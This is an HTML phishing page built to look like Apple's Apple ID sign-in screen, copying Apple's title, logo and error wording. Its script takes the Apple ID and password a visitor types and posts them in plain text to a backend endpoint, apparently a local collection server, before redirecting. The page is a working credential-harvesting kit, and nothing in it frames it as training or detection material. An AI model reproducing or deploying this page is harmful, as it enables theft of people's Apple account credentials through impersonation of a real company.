<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in with your Apple ID - Apple</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}

body{
background:#fbfbfd;
color:#1d1d1f;
display:flex;
flex-direction:column;
min-height:100vh;
}

nav{
background:rgba(255,255,255,0.8);
backdrop-filter:saturate(180%) blur(20px);
height:48px;
display:flex;
justify-content:center;
align-items:center;
border-bottom:1px solid #e5e5ea;
}

nav svg{
fill:#1d1d1f;
width:16px;
height:44px;
}

.main-container{
flex-grow:1;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
}

.login-box{
width:100%;
max-width:480px;
text-align:center;
}

.login-box h1{
font-size:32px;
font-weight:600;
margin-bottom:8px;
}

.subtitle{
font-size:17px;
color:#86868b;
margin-bottom:40px;
}

.input-group{
position:relative;
margin-bottom:16px;
}

.input-group input{
width:100%;
height:56px;
padding:20px 16px 6px;
font-size:17px;
border:1px solid #d2d2d7;
border-radius:12px;
background:white;
outline:none;
}

.input-group input:focus{
border-color:#0071e3;
box-shadow:0 0 0 1px #0071e3;
}

.input-group label{
position:absolute;
left:16px;
top:18px;
color:#86868b;
transition:0.2s;
}

.input-group input:focus~label,
.input-group input:not(:placeholder-shown)~label{
top:8px;
font-size:12px;
}

.password-wrapper{
position:relative;
display:none;
}

.continue-btn{
position:absolute;
right:8px;
top:8px;
width:40px;
height:40px;
border-radius:50%;
background:#f5f5f7;
border:none;
cursor:pointer;
display:flex;
align-items:center;
justify-content:center;
}

.continue-btn.active{
background:#0071e3;
color:white;
}

.checkbox-container{
display:flex;
align-items:center;
justify-content:center;
margin-top:24px;
font-size:14px;
}

.links{
margin-top:32px;
display:flex;
flex-direction:column;
gap:12px;
}

.links a{
color:#0071e3;
text-decoration:none;
}

.divider{
margin:40px auto;
border-top:1px solid #d2d2d7;
max-width:320px;
}

#error-msg{
color:#e3000f;
margin-top:12px;
display:none;
}

</style>
</head>

<body>

<nav>
<svg viewBox="0 0 14 44">
<path d="M13.0729 17.68C13.064 15.655 14.6295 14.73 14.7001 14.685C13.7842 13.345 12.3924 13.13 11.9023 13.09C10.7483 12.97 9.57656 13.775 8.98357 13.775C8.3813 13.775 7.42436 13.12 6.47161 13.13C5.2323 13.145 4.0772 13.845 3.44747 14.945C2.15802 17.18 3.11663 20.485 4.37517 22.3Z"/>
</svg>
</nav>

<main class="main-container">

<div class="login-box">

<h1>Sign in with your Apple ID</h1>
<p class="subtitle">You will be signed in to Apple Store and Apple services.</p>

<form id="apple-login-form">

<div class="input-group">

<input type="text" id="apple_id" placeholder=" " required>
<label>Apple ID</label>

<button type="button" class="continue-btn" id="btn-email-next" disabled>
➜
</button>

</div>

<div class="input-group password-wrapper" id="password-group">

<input type="password" id="password" placeholder=" " required>
<label>Password</label>

<button type="submit" class="continue-btn" id="btn-submit" disabled>
➜
</button>

</div>

<p id="error-msg">Your Apple ID or password was incorrect.</p>

<div class="checkbox-container">
<input type="checkbox" checked>
<label>Remember me</label>
</div>

</form>

<div class="links">
<a href="#">Forgot password?</a>
<a href="#">Forgot Apple ID?</a>
</div>

<div class="divider"></div>

<a href="register.html">Create yours now.</a>

</div>
</main>

<script>

const appleInput=document.getElementById("apple_id")
const passInput=document.getElementById("password")
const nextBtn=document.getElementById("btn-email-next")
const loginBtn=document.getElementById("btn-submit")
const passGroup=document.getElementById("password-group")
const form=document.getElementById("apple-login-form")
const errorMsg=document.getElementById("error-msg")


appleInput.addEventListener("input",()=>{

if(appleInput.value.length>0){

nextBtn.disabled=false
nextBtn.classList.add("active")

}else{

nextBtn.disabled=true
nextBtn.classList.remove("active")

}

})


nextBtn.addEventListener("click",()=>{

passGroup.style.display="block"
appleInput.readOnly=true
nextBtn.style.display="none"

})


passInput.addEventListener("input",()=>{

if(passInput.value.length>0){

loginBtn.disabled=false
loginBtn.classList.add("active")

}else{

loginBtn.disabled=true
loginBtn.classList.remove("active")

}

})


form.addEventListener("submit",(e)=>{

e.preventDefault()

errorMsg.style.display="none"

const apple_id=appleInput.value
const password=passInput.value

const xhr=new XMLHttpRequest()

xhr.onload=function(){

const res=JSON.parse(this.responseText)

if(res.status===1){

window.location.href="myapple.html"

}else{

errorMsg.style.display="block"

}

}

xhr.open("POST","http://127.0.0.1:5000/api/apple-login")

xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")

xhr.send(
"apple_id="+encodeURIComponent(apple_id)+"&password="+encodeURIComponent(password)
)

})

</script>

</body>
</html>
